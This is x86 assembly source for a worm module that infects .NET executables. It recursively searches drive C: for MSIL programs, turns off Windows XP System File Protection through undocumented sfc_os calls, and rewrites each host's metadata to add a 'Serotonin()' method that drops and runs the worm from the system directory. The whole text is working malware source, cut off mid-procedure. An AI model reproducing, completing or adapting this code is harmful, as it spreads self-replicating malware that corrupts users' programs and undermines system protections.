;Descr:	This gen search'es for MSIL-PE-EXE files (.NET) on the C: disk and implants there
;	worm MSIL code. Such code can extract and run worm dropper and execute host program.
;	Also, it can turn off System File Protection under Windows XP for victim file.
;
;Type:	GEN_CUSTOM
;
;INPUT:
;(EBX)	NONE
;
;OUTPUT:
;(EAX)	NONE
;

dotnet	Proc
	pushad
	@SEH_SetupFrame	<jmp	net_seh>
	call	net_delta
net_delta:
	pop	ebp				;get delta offset

	@pushsz	'KERNEL32'
	call	esi				;get address of KERNEL32.dll
	xchg	eax,ebx
	@pushsz	'FindFirstFileA'
	push	ebx
	call	edi				;get api addresses
	mov	[ebp + net_FindFirstFileA - net_delta],eax
	@pushsz	'FindNextFileA'
	push	ebx
	call	edi
	mov	[ebp + net_FindNextFileA - net_delta],eax
	@pushsz	'FindClose'
	push	ebx
	call	edi
	mov	[ebp + net_FindClose - net_delta],eax
	@pushsz	'SetCurrentDirectoryA'
	push	ebx
	call	edi
	mov	[ebp + net_SetCurrentDirectoryA - net_delta],eax
	@pushsz	'CreateFileA'
	push	ebx
	call	edi
	mov	[ebp + net_CreateFileA - net_delta],eax
	@pushsz	'CreateFileMappingA'
	push	ebx
	call	edi
	mov	[ebp + net_CreateFileMappingA - net_delta],eax
	@pushsz	'MapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + net_MapViewOfFile - net_delta],eax
	@pushsz	'UnmapViewOfFile'
	push	ebx
	call	edi
	mov	[ebp + net_UnmapViewOfFile - net_delta],eax
	@pushsz	'CloseHandle'
	push	ebx
	call	edi
	mov	[ebp + net_CloseHandle - net_delta],eax
	@pushsz	'Sleep'
	push	ebx
	call	edi
	mov	[ebp + net_Sleep - net_delta],eax
	@pushsz	'LoadLibraryA'
	push	ebx
	call	edi
	mov	[ebp + net_LoadLibraryA - net_delta],eax
	@pushsz	'FreeLibrary'
	push	ebx
	call	edi
	mov	[ebp + net_FreeLibrary - net_delta],eax
	@pushsz	'GetProcAddress'
	push	ebx
	call	edi
	mov	[ebp + net_GetProcAddress - net_delta],eax
	@pushsz	'VirtualAlloc'
	push	ebx
	call	edi
	mov	[ebp + net_VirtualAlloc - net_delta],eax
	@pushsz	'VirtualFree'
	push	ebx
	call	edi
	mov	[ebp + net_VirtualFree - net_delta],eax
	@pushsz	'GetSystemDirectoryA'
	push	ebx
	call	edi
	mov	[ebp + net_GetSystemDirectoryA - net_delta],eax
	@pushsz	'GetFileSize'
	push	ebx
	call	edi
	mov	[ebp + net_GetFileSize - net_delta],eax
	@pushsz	'ReadFile'
	push	ebx
	call	edi
	mov	[ebp + net_ReadFile - net_delta],eax
	@pushsz	'MoveFileExW'
	push	ebx
	call	edi
	mov	[ebp + net_MoveFileExW - net_delta],eax
	@pushsz	'DeleteFileW'
	push	ebx
	call	edi
	mov	[ebp + net_DeleteFileW - net_delta],eax



	@pushsz	'OLE32'
	call	esi				;get address of OLE32.DLL
	test	eax,eax
	je	net_seh
	xchg	eax,ebx
	@pushsz	'CoCreateInstance'
	push	ebx
	call	edi				;retrieve addresses of APIz
	mov	[ebp + net_CoCreateInstance - net_delta],eax
	@pushsz	'CoUninitialize'
	push	ebx
	call	edi
	mov	[ebp + net_CoUninitialize - net_delta],eax
	@pushsz	'CoInitialize'
	push	ebx
	call	edi				;retrieve addresses of APIz

	push	0
	call	eax				;initialize COM

	@pushsz	'C:\'				;search path as argument
	call	net_FileSearch			;search for MSIL PE EXE filez in C:\

	mov	eax,12345678h
net_CoUninitialize = dword ptr $-4
	call	eax				;unitialize COM


net_seh:@SEH_RemoveFrame
	popad
	ret					;quit



;recursive filesearch procedure

net_FileSearch:
	pushad
	push	dword ptr [esp.cPushad+4]
	mov	eax,12345678h
net_SetCurrentDirectoryA = dword ptr $-4
	call	eax				;go to specified directory

	call	@net_wfd
net_WFD	WIN32_FIND_DATA	?
@net_wfd:
	pop	esi
	push	esi
	@pushsz	'*.*'
	mov	eax,12345678h
net_FindFirstFileA = dword ptr $-4
	call	eax				;find first file there
	inc	eax
	je	net_err_fs
	dec	eax
	xchg	eax,ebx

net_fs_analyse:
	cmp	word ptr [esi.WFD_szFileName],'.'
	je	net_fs_fnfa			;mustn't be '.' directory
	mov	eax,dword ptr [esi.WFD_szFileName]
	and	eax,0FFFFFFh
	add	eax,-'..'
	je	net_fs_fnfa			;and '..' directory
	test	dword ptr [esi],FILE_ATTRIBUTE_DIRECTORY
	jne	net_fs_open_dir			;jump if it's directory

						;save file size
	push	esi
	add	esi,WFD_szFileName
	mov	edx,esi				;EDX = filename
	@endsz					;ESI = end of filename string
	mov	eax,[esi-4]			;EAX = file extension
	or	eax,202020h			;lowercase
	pop	esi
	sub	eax,'exe'			;must be EXE
	jne	net_fs_fnfa			;find next file if its not

	pushad

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	0
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	edx
	mov	eax,12345678h
net_CreateFileA = dword ptr $-4
	call	eax				;open file
	inc	eax
	je	net_fs_fnfa
	dec	eax
	mov	[ebp + net_hFile - net_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	PAGE_READONLY
	push	edx
	push	eax
	mov	eax,12345678h
net_CreateFileMappingA = dword ptr $-4
	call	eax
	test	eax,eax
	je	net_fs_closefile
	mov	[ebp + net_hMapFile - net_delta],eax

	cdq
	push	edx
	push	edx
	push	edx
	push	FILE_MAP_READ
	push	eax
	mov	eax,12345678h
net_MapViewOfFile = dword ptr $-4
	call	eax				;map file
	xchg	eax,ecx
	test	ecx,ecx
	je	net_fs_closefilemap
	mov	[ebp + net_mappedfile - net_delta],ecx

	pushad
	push	300				;(miliseconds)
	mov	eax,12345678h
net_Sleep = dword ptr $-4
	call	eax				;wait some time
	popad

	xor	eax,eax
	mov	esi,ecx
	lodsw					;get first 2 bytez
	add	eax,-IMAGE_DOS_SIGNATURE
	jne	net_fs_unmapfile		;quit if not MZ
	mov	eax,[ecx.MZ_lfanew]		;get offset to PE
	test	eax,eax
	je	net_fs_unmapfile		;quit if zero
	cmp	eax,[ebp + net_WFD.WFD_nFileSizeLow - net_delta]
	jnb	net_fs_unmapfile		;quit if offset longer than file itself

	dec	eax
	dec	eax
	add	esi,eax
	lodsd					;get signature
	add	eax,-IMAGE_NT_SIGNATURE
	jne	net_fs_unmapfile		;quit if not PE

	mov	eax,dword ptr [esi.NT_OptionalHeader.OH_DirectoryEntries.DE_CLR.DD_VirtualAddress-4]
	test	eax,eax				;get RVA of CLR descriptor
	je	net_fs_unmapfile		;quit if file does not contain CLR descriptor (non-MSIL program)
	call	net_rva2raw			;get raw pointer from RVA


	xchg	eax,ebx				;to EBX
	xor	eax,eax
	cmp	[ebx.CH_StrongNameSignature.DD_Size],eax
	jne	net_fs_unmapfile		;quit if program is hash-protected
	cmp	[ebx.CH_VTableFixups.DD_Size],eax
	jne	net_fs_unmapfile		;quit if v-table fixups are present
	cmp	[ebx.CH_Resources.DD_Size],eax
	jne	net_fs_unmapfile		;quit if program contains CLR resources

	mov	eax,[ebx.CH_EntryPointToken]
	mov	[ebp + net_EntryPointToken - net_delta],eax
						;save entrypoint token

	lea	eax,[ebp + net_outfilew - net_delta]
	push	eax
	mov	eax,12345678h
net_DeleteFileW = dword ptr $-4
	call	eax				;delete temporary file

	call	net_sfp_disable			;disable SFP under Windows XP+

	call	net_com_metadata		;infect program!

net_fs_unmapfile:
	push	12345678h
net_mappedfile = dword ptr $-4
	mov	eax,12345678h
net_UnmapViewOfFile = dword ptr $-4
	call	eax				;unmap file
net_fs_closefilemap:
	push	12345678h
net_hMapFile = dword ptr $-4
	call	[ebp + net_CloseHandle - net_delta]
net_fs_closefile:
	push	12345678h
net_hFile = dword ptr $-4
	mov	eax,12345678h
net_CloseHandle = dword ptr $-4
	call	eax				;close file


	push	1				;MOVEFILE_REPLACE_EXISTING
	lea	eax,[ebp + net_unicode_filename - net_delta]
	push	eax
	lea	eax,[ebp + net_outfilew - net_delta]
	push	eax
	mov	eax,12345678h
net_MoveFileExW = dword ptr $-4
	call	eax				;replace program with the (infected) temp file

	popad



net_fs_fnfa:
	lea	esi,[ebp + net_WFD - net_delta]
	push	esi
	push	ebx
	mov	eax,12345678h
net_FindNextFileA = dword ptr $-4
	call	eax				;try to find next file
	dec	eax
	je	net_fs_analyse			;continue, if found

	push	ebx
	mov	eax,12345678h
net_FindClose = dword ptr $-4
	call	eax				;close search handle
	@pushsz	'..'				;and go to up-dir
	call	[ebp + net_SetCurrentDirectoryA - net_delta]
net_err_fs:	
	popad
	ret	4				;and quit from procedure
net_fs_open_dir:
	lea	eax,[esi.WFD_szFileName]
	push	eax
	call	net_FileSearch			;open directory and search there
	jmp	net_fs_fnfa			;(recursively)






;this procedure can disable SFP under Windows XP for 1 minute using undocumented
;API compatible way - thnx to Ratter/29A.

net_sfp_disable	Proc
	pushad
	@SEH_SetupFrame	<jmp	net_sfp_seh>	;set SEH frame

	@pushsz	'sfc_os'
	mov	eax,12345678h
net_LoadLibraryA = dword ptr $-4
	call	eax				;load sfc_os.dll
	test	eax,eax
	je	net_sfp_seh			;quit if error
	mov	[ebp + net_sfc_os - net_delta],eax
	xchg	eax,ebx				;EBX = address of sfc_os.dll

	;convert ansi filename to unicode

	lea	esi,[ebp + net_WFD.WFD_szFileName - net_delta]
	lea	edi,[ebp + net_unicode_filename - net_delta]
	xor	eax,eax
net_unicode_loop:
	lodsb					;get one byte
	stosw					;save unicode character
	test	al,al
	jne	net_unicode_loop		;in a loop...


	push	4
	push	ebx
	mov	edi,12345678h
net_GetProcAddress = dword ptr $-4
	call	edi				;get address of "SfcClose" (export #4)
	xchg	eax,ebp				;to EBP

	push	5
	push	ebx
	call	edi				;get address of "SfcFileException" (export #5)
	xchg	eax,esi				;to ESI

	push	3
	push	ebx
	call	edi				;get address of "SfcConnectToRpcServer" (export #3)

	push	0
	call	eax				;connect to SFC RPC server
	xchg	eax,ebx				;RPC handle to EBX

	push	-1				;some strange variable, -1 becoz its TESTed
	call	@net_unicode_filename
net_unicode_filename	dw	MAX_PATH dup (?);unicode filename
@net_unicode_filename:
	push	ebx				;RPC handle
	call	esi				;call "SfcFileException" API
						;(this give us 1 minute for infection)

	push	ebx				;RPC handle
	call	ebp				;call "SfcClose" API

	push	12345678h
net_sfc_os = dword ptr $-4
	mov	eax,12345678h
net_FreeLibrary = dword ptr $-4
	call	eax				;unload sfc_os.dll

net_sfp_seh:
	@SEH_RemoveFrame
net_err_com:
	popad
	ret					;and quit
net_sfp_disable	EndP






;this procedure can implant new worm code to currently found CLR-MSIL-PE file
;and recompile it.

net_com_metadata	Proc
	pushad
	lea	eax,[ebp + net_pDisp - net_delta]
	push	eax
	call	@net_iid
	IID_IMetaDataDispenserEx
@net_iid:
	push	1				;CLSCTX_INPROC_SERVER
	push	0
	call	@net_clsid
	CLSID_CorMetaDataDispenser
@net_clsid:
	mov	eax,12345678h
net_CoCreateInstance = dword ptr $-4
	call	eax				;create instance of COR dispenser object in memory
	test	eax,eax
	jne	net_err_com

	lea	eax,[ebp + net_pEmit - net_delta]
	push	eax
	call	@net_iid2
	IID_IMetaDataEmit
@net_iid2:
	push	ofWrite
	lea	eax,[ebp + net_unicode_filename - net_delta]
	push	eax
	mov	eax,12345678h
net_pDisp = dword ptr $-4
	mov	ecx,[eax]
	push	eax				;request metadata emitter interface on host file...
	call	[ecx.IMetaDataDispenser_OpenScope]
	test	eax,eax
	jne	net_err1_com

	lea	eax,[ebp + net_pAsmEmit - net_delta]
	push	eax
	call	@net_iid3
	IID_IMetaDataAssemblyEmit
@net_iid3:
	mov	eax,[ebp + net_pEmit - net_delta]
	push	eax		;request assembly metadata (manifest) emitter interface on host file
	mov	eax,[eax]
	call	[eax.IUnknown_QueryInterface]

	lea	ecx,[ebp + net_SystemAsm - net_delta]
	push	ecx
	push	eax
	push	eax
	push	eax
	call	@net_AssemblyMetadata
net_AssemblyMetadata:
	dw	1
	dw	0
	dw	3300
	dw	0
	dd	0
	dd	0
	dd	0
	dd	0
	dd	3 dup (0)
	dd	0
@net_AssemblyMetadata:
	call	@net_SystemString
	dw	'S','y','s','t','e','m',0
@net_SystemString:
	push	8
	call	@net_pkeytoken
net_pkeytoken	db	0B7h,07Ah,05Ch,056h,019h,034h,0E0h,089h
@net_pkeytoken:
	mov	esi,12345678h
net_pAsmEmit = dword ptr $-4
	push	esi
	mov	edi,[esi]
	call	[edi.IMetaDataAssemblyEmit_DefineAssemblyRef]
						;define reference to "System" assembly

	lea	ecx,[ebp + net_mscorlibAsm - net_delta]
	push	ecx
	push	eax
	push	eax
	push	eax
	lea	eax,[ebp + net_AssemblyMetadata - net_delta]
	push	eax
	call	@net_mscorlibString
	dw	'm','s','c','o','r','l','i','b',0
@net_mscorlibString:
	push	8
	lea	eax,[ebp + net_pkeytoken - net_delta]
	push	eax
	push	esi
	call	[edi.IMetaDataAssemblyEmit_DefineAssemblyRef]
						;define reference to "mscorlib" assembly

	push	esi
	call	[edi.IUnknown_Release]		;release interface


	lea	eax,[ebp + net_pImp - net_delta]
	push	eax
	call	@net_iid4
	IID_IMetaDataImport
@net_iid4:
	push	ofRead
	lea	eax,[ebp + net_unicode_filename - net_delta]
	push	eax
	mov	eax,[ebp + net_pDisp - net_delta]
	mov	ecx,[eax]
	push	eax				;request metadata explorer interface on host file...
	call	[ecx.IMetaDataDispenser_OpenScope]


	lea	eax,[ebp + net_dwImplFlags - net_delta]
	push	eax
	push	0
	lea	ecx,[ebp + net_cbSig - net_delta]
	mov	dword ptr [ecx],30
	push	ecx
	lea	ecx,[ebp + net_pSig - net_delta]
	push	ecx
	lea	eax,[ebp + net_dwAttr - net_delta]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	lea	eax,[ebp + net_pClass - net_delta]
	push	eax
	push	dword ptr [ebp + net_EntryPointToken - net_delta]
	mov	esi,[ebp + net_pImp - net_delta]
	mov	edi,[esi]
	push	esi
	call	[edi.IMetaDataImport_GetMethodProps]
						;get properties of method where points the entrypoint token

	;now check if the file is already infected


	lea	ecx,[ebp + net_inf_check_handle - net_delta]
	and 	[ecx],eax
	and	[ebp + net_inf_check - net_delta],eax
	lea	eax,[ebp + net_tmp - net_delta]
	push	eax
	push	1
	lea	eax,[ebp + net_inf_check - net_delta]
	push	eax
	lea	eax,[ebp + net_serotoninw - net_delta]
	push	eax
	push	dword ptr [ebp + net_pClass - net_delta]
	push	ecx
	push	esi
	call	[edi.IMetaDataImport_EnumMembersWithName]	;look if Serotonin() method already exists

	mov	ecx,12345678h
net_inf_check = dword ptr $-4
	jecxz	net_not_infected				;no, continue

	mov	eax,12345678h					;yeah, close enumeration handle
net_inf_check_handle = dword ptr $-4
	call	net_close_enum
	jmp	net_err2_com					;and quit


net_not_infected:						;file is not infected
	mov	eax,[ebp + net_inf_check_handle - net_delta]
	call	net_close_enum					;close enumeration handle
								;and continue...
	lea	eax,[ebp + net_methodToken - net_delta]
	push	eax
	push	12345678h
net_dwImplFlags = dword ptr $-4
	push	0
	push	12345678h
net_cbSig = dword ptr $-4
	push	12345678h
net_pSig = dword ptr $-4
	push	12345678h
net_dwAttr = dword ptr $-4
	call	@net_serotoninw
net_serotoninw	dw	'S','e','r','o','t','o','n','i','n',0
@net_serotoninw:
	push	12345678h
net_pClass = dword ptr $-4
	mov	esi,12345678h
net_pEmit = dword ptr $-4
	mov	edi,[esi]
	push	esi
	call	[edi.IMetaDataEmit_DefineMethod]	;define new main method - "Serotonin()"
	test	eax,eax
	jne	net_err2_com



	;DECLARE external referencez and DEFINE new class members needed by MSIL code of worm



	lea	eax,[ebp + net_member_system_valuetype - net_delta]
	push	eax
	call	@net_valuetype_string
	dw	'S','y','s','t','e','m','.','V','a','l','u','e','T','y','p','e',0
@net_valuetype_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	ecx,[ebp + net_class_scs - net_delta]
	push	ecx
	push	eax
	push	12345678
net_member_system_valuetype = dword ptr $-4
	push	tdPublic or tdExplicitLayout or tdClass or tdSealed or tdAnsiClass
	call	@net_scs_string
	dw	's','c','s',0
@net_scs_string:
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeDef]	;define new class "scs" (needed for type conversion)



	;.field static privatescope unsigned int8[] b
	;this field is used for accessing binary data from inside MSIL code

	lea	ecx,[ebp + net_field_int8_bytes - net_delta]
	push	ecx
	push	eax
	push	eax
	push	eax
	push	3
	call	@net_fieldsig_u1
	db	IMAGE_CEE_CS_CALLCONV_FIELD,ELEMENT_TYPE_SZARRAY,ELEMENT_TYPE_U1
@net_fieldsig_u1:
	push	fdPrivateScope or fdInitOnly or fdStatic
	call	@net_field_u1
	dw	'b',0
@net_field_u1:
	push	dword ptr [ebp + net_pClass - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineField]
	test	eax,eax
	jne	net_err2_com

	mov	ecx,[ebp + net_field_int8_bytes - net_delta]
	mov	[ebp + net_field_int8_bytes2 - net_delta],ecx
							;save token


	;.field static valuetype scs scm
	;this field is used for type conversion from raw binary data to "unsigned int8[]"

	lea	ecx,[ebp + net_field_scm - net_delta]
	push	ecx
	push	eax
	push	eax
	push	eax
	push	2
	call	@net_fieldsig_scm
	db	IMAGE_CEE_CS_CALLCONV_FIELD,ELEMENT_TYPE_VALUETYPE
	dd	?
@net_fieldsig_scm:
	mov	eax,[ebp + net_class_scs - net_delta]
	call	net_compress_token
	mov	edx,[esp]
	add	edx,2
	mov	[edx],eax
	add	[esp+4],ecx
	push	fdAssem or fdStatic
	call	@net_field_scm
	dw	's','c','m',0
@net_field_scm:
	push	dword ptr [ebp + net_pClass - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineField]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_stringToken - net_delta]
	push	eax
	push	13
	call	@net_string
	dw	's','e','r','o','t','o','n','i','n','.','e','x','e',0
@net_string:
	push	esi
	call	[edi.IMetaDataEmit_DefineUserString]	;define new string "serotonin.exe"
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_byte - net_delta]
	push	eax
	call	@net_byte_string
	dw	'S','y','s','t','e','m','.','B','y','t','e',0
@net_byte_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_array - net_delta]
	push	eax
	call	@net_array_string
	dw	'S','y','s','t','e','m','.','A','r','r','a','y',0
@net_array_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_runtime_field - net_delta]
	push	eax
	call	@net_runtime_field_string
	dw	'S','y','s','t','e','m','.','R','u','n','t','i','m','e','F','i','e','l','d','H','a','n','d','l','e',0
@net_runtime_field_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_io_filestream - net_delta]
	push	eax
	call	@net_filestream_string
	dw	'S','y','s','t','e','m','.','I','O','.','F','i','l','e','S','t','r','e','a','m',0
@net_filestream_string:
	push	12345678h
net_mscorlibAsm = dword ptr $-4
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_io_stream - net_delta]
	push	eax
	call	@net_stream_string
	dw	'S','y','s','t','e','m','.','I','O','.','S','t','r','e','a','m',0
@net_stream_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_io_filemode - net_delta]
	push	eax
	call	@net_filemode_string
	dw	'S','y','s','t','e','m','.','I','O','.','F','i','l','e','M','o','d','e',0
@net_filemode_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_io_fileaccess - net_delta]
	push	eax
	call	@net_fileaccess_string
	dw	'S','y','s','t','e','m','.','I','O','.','F','i','l','e','A','c','c','e','s','s',0
@net_fileaccess_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com


	mov	eax,12345678h				;get TypeRef token
net_member_system_io_filemode = dword ptr $-4
	call	net_compress_token			;compress token for use inside method signature

	;construct method signature

	lea	edx,[ebp + net_member_ctor1 - net_delta]
	push	edx
	push	6
	call	@net_ctor1_sig
	db	IMAGE_CEE_CS_CALLCONV_HASTHIS,3,ELEMENT_TYPE_VOID,ELEMENT_TYPE_STRING,ELEMENT_TYPE_VALUETYPE
	dd	?
	db	?
	dd	?
@net_ctor1_sig:
	mov	edx,[esp]
	add	edx,5
	mov	[edx],eax
	add	edx,ecx
	add	[esp+4],ecx
	mov	byte ptr [edx],ELEMENT_TYPE_VALUETYPE
	inc	edx

	push	edx
	mov	eax,12345678h				;get TypeRef token
net_member_system_io_fileaccess = dword ptr $-4
	call	net_compress_token			;compress it
	pop	edx
	mov	[edx],eax
	add	[esp+4],ecx

	call	@net_ctor_string
	dw	'.','c','t','o','r',0
@net_ctor_string:
	push	12345678h
net_member_system_io_filestream = dword ptr $-4
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_io_binarywriter - net_delta]
	push	eax
	call	@net_binarywriter_string
	dw	'S','y','s','t','e','m','.','I','O','.','B','i','n','a','r','y','W','r','i','t','e','r',0
@net_binarywriter_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	;construct method signature

	mov	eax,12345678h
net_member_system_io_stream = dword ptr $-4
	call	net_compress_token

	lea	edx,[ebp + net_member_ctor2 - net_delta]
	push	edx
	push	ecx
	call	@net_ctor2_sig
	db	IMAGE_CEE_CS_CALLCONV_HASTHIS,1,ELEMENT_TYPE_VOID,ELEMENT_TYPE_CLASS
	dd	?
@net_ctor2_sig:
	mov	edx,[esp]
	add	edx,4
	mov	[edx],eax
	add	byte ptr [esp+4],4

	lea	eax,[ebp + @net_ctor_string-12 - net_delta]
	push	eax
	push	12345678h
net_member_system_io_binarywriter = dword ptr $-4
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_write - net_delta]
	push	eax
	push	5
	call	@net_write_sig
	db	IMAGE_CEE_CS_CALLCONV_HASTHIS,1,ELEMENT_TYPE_VOID,ELEMENT_TYPE_SZARRAY,ELEMENT_TYPE_U1
@net_write_sig:
	call	@net_write_string
	dw	'W','r','i','t','e',0
@net_write_string:
	push	dword ptr [ebp + net_member_system_io_binarywriter - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com

	lea	edx,[ebp + net_member_close - net_delta]
	push	edx
	push	3
	call	@net_close_sig
	db	IMAGE_CEE_CS_CALLCONV_HASTHIS,0,ELEMENT_TYPE_VOID
@net_close_sig:
	call	@net_close_string
	dw	'C','l','o','s','e',0
@net_close_string:
	push	dword ptr [ebp + net_member_system_io_binarywriter - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com

	lea	eax,[ebp + net_member_system_diagnostics_process - net_delta]
	push	eax
	call	@net_process_string
	dw	'S','y','s','t','e','m','.','D','i','a','g','n','o','s','t','i','c','s','.','P','r','o','c','e','s','s',0
@net_process_string:
	push	12345678h
net_SystemAsm = dword ptr $-4
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	;construct method signature

	mov	eax,12345678h
net_member_system_diagnostics_process = dword ptr $-4
	call	net_compress_token

	lea	edx,[ebp + net_member_start - net_delta]
	push	edx
	push	ecx
	call	@net_start_sig
	db	IMAGE_CEE_CS_CALLCONV_DEFAULT,1,ELEMENT_TYPE_CLASS
	dd	?
	db	?,?
@net_start_sig:
	mov	edx,[esp]
	add	edx,3
	mov	[edx],eax
	add	edx,ecx
	add	byte ptr [esp+4],4
	mov	byte ptr [edx],ELEMENT_TYPE_STRING

	call	@net_start_string
	dw	'S','t','a','r','t',0
@net_start_string:
	push	dword ptr [ebp + net_member_system_diagnostics_process - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com

	;construct signature of local variables of worm main "Serotonin()" method

	mov	eax,[ebp + net_member_system_io_binarywriter - net_delta]
	call	net_compress_token

	lea	edx,[ebp + net_localVars_signature - net_delta]
	push	edx
	push	4
	call	@net_lv_signature
	db	IMAGE_CEE_CS_CALLCONV_LOCAL_SIG,2,ELEMENT_TYPE_STRING,ELEMENT_TYPE_CLASS
	dd	?
@net_lv_signature:
	mov	edx,[esp]
	add	edx,4
	mov	[edx],eax
	add	[esp+4],ecx

	push	esi
	call	[edi.IMetaDataEmit_GetTokenFromSig]

	lea	eax,[ebp + net_member_system_runtime - net_delta]
	push	eax
	call	@net_runtime_string
	dw	'S','y','s','t','e','m','.','R','u','n','t','i','m','e','.','C','o','m','p','i','l','e','r','S','e','r','v','i','c','e','s','.','R','u','n','t','i','m','e','H','e','l','p','e','r','s',0
@net_runtime_string:
	push	dword ptr [ebp + net_mscorlibAsm - net_delta]
	push	esi
	call	[edi.IMetaDataEmit_DefineTypeRefByName]
	test	eax,eax
	jne	net_err2_com

	mov	eax,12345678h
net_member_system_array = dword ptr $-4
	call	net_compress_token

	;construct method signature

	lea	edx,[ebp + net_member_initarray - net_delta]
	push	edx
	push	5
	call	@net_initarray_sig
	db	IMAGE_CEE_CS_CALLCONV_DEFAULT,2,ELEMENT_TYPE_VOID,ELEMENT_TYPE_CLASS
	dd	?
	db	?
	dd	?
@net_initarray_sig:
	mov	edx,[esp]
	add	edx,4
	mov	[edx],eax
	add	edx,ecx
	add	[esp+4],ecx
	mov	byte ptr [edx],ELEMENT_TYPE_VALUETYPE
	inc	edx

	push	edx
	mov	eax,12345678h
net_member_runtime_field = dword ptr $-4
	call	net_compress_token
	pop	edx
	mov	[edx],eax
	add	[esp+4],ecx

	call	@net_initarray_string
	dw	'I','n','i','t','i','a','l','i','z','e','A','r','r','a','y',0
@net_initarray_string:
	push	12345678h
net_member_system_runtime = dword ptr $-4
	push	esi
	call	[edi.IMetaDataEmit_DefineMemberRef]
	test	eax,eax
	jne	net_err2_com


	push	MAX_PATH-14
	call	net_path
	db	MAX_PATH dup (?)
net_path:
	pop	edi
	push	edi
	mov	eax,12345678h
net_GetSystemDirectoryA = dword ptr $-4
	call	eax					;call GetSystemDirectoryA
	push	edi
	add	edi,eax
	mov	eax,'niw\'				;construct %sysdir%\win32ser.exe
	stosd
	mov	eax,'es23'
	stosd
	mov	eax,'xe.r'
	stosd
	mov	ax,'e'
	stosw
	pop	edi					;edi = path\filename of worm on the disk

	push	0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	0
	push	FILE_SHARE_READ or FILE_SHARE_WRITE
	push	GENERIC_READ
	push	edi
	call	[ebp + net_CreateFileA - net_delta]	;open file
	inc	eax
	je	net_err2_com
	dec	eax
	mov	[ebp + net_fHandle - net_delta],eax

	push	0
	push	eax
	mov	eax,12345678h
net_GetFileSize = dword ptr $-4
	call	eax					;get its size
	mov	[ebp + net_droppercodesize - net_delta],eax
	push	eax

	push	PAGE_READWRITE
	push	MEM_RESERVE
	push	4000000h
	push	0
	call	[ebp + net_VirtualAlloc - net_delta]	;reserve 64MB of memory
	mov	[ebp + net_il_memory - net_delta],eax

	push	PAGE_READWRITE
	push	MEM_COMMIT
	push	10000h
	push	eax
	call	[ebp + net_VirtualAlloc - net_delta]	;alloc first 64 KiloBytez

	lea	esi,[ebp + net_IL_code - net_delta]
	mov	ecx,net_ILcode_size
	xchg	eax,edi
	rep	movsb					;copy worm MSIL code there
	mov	[ebp + net_il_memory_offset - net_delta],edi

	push	PAGE_READWRITE
	push	MEM_RESERVE or MEM_COMMIT
	push	eax
	push	0
	call	[ebp + net_VirtualAlloc - net_delta]	;allocate memory for file
	mov	[ebp + net_file_mem - net_delta],eax
	xchg	eax,esi					;address in ESI
	mov	[ebp + net_method_code_ptr - net_delta],esi

	push	0
	call	@net_tmp
net_tmp	dd	?
@net_tmp:
	push	dword ptr [esp+4*2]
	push	esi
	push	dword ptr [ebp + net_fHandle - net_delta]
	mov	eax,12345678h
net_ReadFile = dword ptr $-4
	call	eax					;fill memory with dropper

	pop	ecx
	mov	[ebp + net_il_memory_offset - net_delta],edi
	call	net_copy_il				;copy dropper to MSIL code buffer

	push	MEM_RELEASE
	push	0
	push	12345678h
net_file_mem = dword ptr $-4
	call	[ebp + net_VirtualFree - net_delta]	;free memory used to store dropper file


	push	12345678h
net_fHandle = dword ptr $-4
	call	[ebp + net_CloseHandle - net_delta]	;close handle of dropper file



	@pushsz	'mscorpe'
	call	[ebp + net_LoadLibraryA - net_delta]	;load mscorpe.dlll
	test	eax,eax
	je	net_unload_mscorpe
	mov	[ebp + net_mscorpe - net_delta],eax
	xchg	eax,ebx

	@pushsz	'DestroyICeeFileGen'
